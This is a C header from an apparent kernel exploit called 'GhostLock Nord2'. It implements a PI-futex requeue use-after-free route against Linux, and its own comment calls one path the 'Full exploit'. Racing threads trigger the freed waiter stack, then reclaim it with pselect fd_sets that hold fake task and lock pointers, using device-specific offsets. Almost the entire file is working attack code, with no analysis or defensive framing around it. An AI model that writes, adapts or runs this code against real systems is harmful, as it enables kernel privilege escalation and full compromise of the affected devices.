/*
 * GhostLock Nord2 - PI futex UAF route
 */
#pragma once
#define _GNU_SOURCE
#include <stdint.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <stdatomic.h>
#include <sys/resource.h>
#include <sys/select.h>
#include <sys/syscall.h>
#include <linux/futex.h>
#include <time.h>
#include "nord2_offsets.h"

#ifndef SYS_futex
#define SYS_futex 98
#endif
#ifndef SYS_sched_setattr
#define SYS_sched_setattr 274
#endif

struct my_sched_attr {
    uint32_t size, sched_policy;
    uint64_t sched_flags;
    int32_t  sched_nice;
    uint32_t sched_priority;
    uint64_t sched_runtime, sched_deadline, sched_period;
};

struct route_state {
    uint32_t f_wait, f_pi_target, f_pi_chain;
    atomic_int waiter_tid, waiter_ready, waiter_waiting;
    atomic_int owner_started, owner_chain_done;
    atomic_int route_done, consume_go, consume_stop;
    int pselect_shift;
    uint64_t fake_task, fake_lock;
    uint64_t page_base;
};

static void rs_reset(struct route_state *rs) {
    rs->f_wait = rs->f_pi_target = rs->f_pi_chain = 0;
    atomic_store(&rs->waiter_tid,      0);
    atomic_store(&rs->waiter_ready,    0);
    atomic_store(&rs->waiter_waiting,  0);
    atomic_store(&rs->owner_started,   0);
    atomic_store(&rs->owner_chain_done,0);
    atomic_store(&rs->route_done,      0);
    atomic_store(&rs->consume_go,      0);
}

static void fdset_word(fd_set *s, int idx, uint64_t v) {
    ((unsigned long*)s)[idx] = (unsigned long)v;
}
static void put_gword(fd_set *in, fd_set *out, fd_set *ex, int gw, uint64_t v) {
    int wps = (PSELECT_ROUTE_NFDS + 63)/64;
    int si = gw/wps, wi = gw%wps;
    if      (gw<0) return;
    else if (si==0) fdset_word(in,  wi, v);
    else if (si==1) fdset_word(out, wi, v);
    else if (si==2) fdset_word(ex,  wi, v);
}
static void build_fdsets(fd_set *in, fd_set *out, fd_set *ex, struct route_state *rs) {
    FD_ZERO(in); FD_ZERO(out); FD_ZERO(ex);
    int s = rs->pselect_shift;
    struct { int w; uint64_t v; } ws[] = {
        {2,0},{3,0},{4,0},{5,1},{6,0},{7,0},{8,0},{9,0},{10,1},{11,0},
        {12, rs->fake_task}, {13, rs->fake_lock}, {14, 3},
    };
    for (size_t i = 0; i < sizeof(ws)/sizeof(ws[0]); i++)
        put_gword(in, out, ex, ws[i].w + s, ws[i].v);
}

static void open_selected_fds(fd_set *in, fd_set *out, fd_set *ex,
                               int block_fd, int nfds) {
    int high = fcntl(block_fd, F_DUPFD, nfds + 32);
    if (high < 0) return;
    for (int fd = 0; fd < nfds; fd++)
        if (FD_ISSET(fd,in)||FD_ISSET(fd,out)||FD_ISSET(fd,ex)) dup2(high, fd);
    close(high);
    dup2(block_fd, nfds-1);
    FD_SET(nfds-1, ex);
}

static void *owner_fn(void *arg) {
    struct route_state *rs = arg;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0,&cs); sched_setaffinity(0,sizeof(cs),&cs);
    struct sched_param sp={.sched_priority=50}; sched_setscheduler(0,SCHED_FIFO,&sp);
    syscall(SYS_futex,&rs->f_pi_target,FUTEX_LOCK_PI,0,NULL,NULL,0);
    while (!atomic_load(&rs->waiter_ready)) usleep(500);
    atomic_store(&rs->owner_started,1);
    syscall(SYS_futex,&rs->f_pi_chain,FUTEX_LOCK_PI,0,NULL,NULL,0);
    atomic_store(&rs->owner_chain_done,1);
    for(;;) sleep(1);
    return NULL;
}

static void *waiter_fn(void *arg) {
    struct route_state *rs = arg;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(1,&cs); sched_setaffinity(0,sizeof(cs),&cs);
    atomic_store(&rs->waiter_tid,(int)syscall(SYS_gettid));
    syscall(SYS_futex,&rs->f_pi_chain,FUTEX_LOCK_PI,0,NULL,NULL,0);
    atomic_store(&rs->waiter_ready,1);
    while (!atomic_load(&rs->owner_started)) usleep(500);
    struct timespec ts; clock_gettime(CLOCK_MONOTONIC,&ts); ts.tv_sec+=30;
    atomic_store(&rs->waiter_waiting,1);
    syscall(SYS_futex,&rs->f_wait,FUTEX_WAIT_REQUEUE_PI,0,&ts,&rs->f_pi_target,0);

    /* After stack freed: pselect with fake waiter data */
    fd_set in,out,ex; build_fdsets(&in,&out,&ex,rs);
    if (rs->page_base) {
        /* Full exploit: open real fds into pselect positions */
        int nfds = PSELECT_ROUTE_NFDS;
        int dn = open("/dev/null",O_RDONLY);
        int bfd = (int)syscall(273/*SYS_timerfd_create*/,1,0);
        if (bfd<0) bfd=dn;
        open_selected_fds(&in,&out,&ex,bfd,nfds);
        struct timeval tv={0,200000};
        pselect(nfds,&in,&out,&ex,(struct timespec*)&tv,NULL);
        close(dn); if(bfd!=dn) close(bfd);
    } else {
        /* Shift-scan test path */
        int dn=open("/dev/null",O_RDONLY);
        int hfd=fcntl(dn,F_DUPFD,PSELECT_ROUTE_NFDS-1); close(dn);
        struct timespec tv={0,1};
        pselect(hfd+1,&in,&out,&ex,&tv,NULL); close(hfd);
    }
    atomic_store(&rs->route_done,1);
    syscall(SYS_futex,&rs->f_pi_chain,FUTEX_UNLOCK_PI,0,NULL,NULL,0);
    while (!atomic_load(&rs->owner_chain_done)) usleep(500);
    return NULL;
}

static void *consumer_fn(void *arg) {
    struct route_state *rs = arg;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(3,&cs); sched_setaffinity(0,sizeof(cs),&cs);
    int seen=0;
    while (!atomic_load(&rs->consume_stop)) {
        int seq=atomic_load(&rs->consume_go);
        if (!seq||seq==seen){__asm__ volatile("yield":::"memory");continue;}
        seen=seq;
        pid_t tid=(pid_t)atomic_load(&rs->waiter_tid);
        for (int i=0;i<200&&atomic_load(&rs->consume_go)==seq;i++){
            struct my_sched_attr a={.size=sizeof(a),.sched_nice=19};
            syscall(SYS_sched_setattr,(long)tid,&a,0UL);
            struct timespec ft={0,10000000};
            long r=syscall(SYS_futex,&rs->f_pi_target,FUTEX_LOCK_PI,0,&ft,NULL,0);
            if (r==0) syscall(SYS_futex,&rs->f_pi_target,FUTEX_UNLOCK_PI,0,NULL,NULL,0);
            usleep(500);
        }
        atomic_store(&rs->consume_go,0);
    }
    return NULL;
}

static int run_route(struct route_state *rs) {
    rs_reset(rs);
    pthread_t ot,wt,ct;
    pthread_create(&ot,NULL,owner_fn,rs);
    pthread_create(&wt,NULL,waiter_fn,rs);
    pthread_create(&ct,NULL,consumer_fn,rs);
    while (!atomic_load(&rs->waiter_waiting)||!atomic_load(&rs->owner_started)) usleep(1000);
    usleep(50000);
    syscall(SYS_futex,&rs->f_wait,FUTEX_CMP_REQUEUE_PI,1,(void*)1UL,&rs->f_pi_target,0);
    atomic_store(&rs->consume_go,1);
    int w=0; while (!atomic_load(&rs->route_done)&&w++<5000) usleep(1000);
    usleep(300000);
    atomic_store(&rs->consume_stop,1);
    pthread_join(ct,NULL);
    pthread_detach(ot); pthread_detach(wt);
    return atomic_load(&rs->route_done);
}
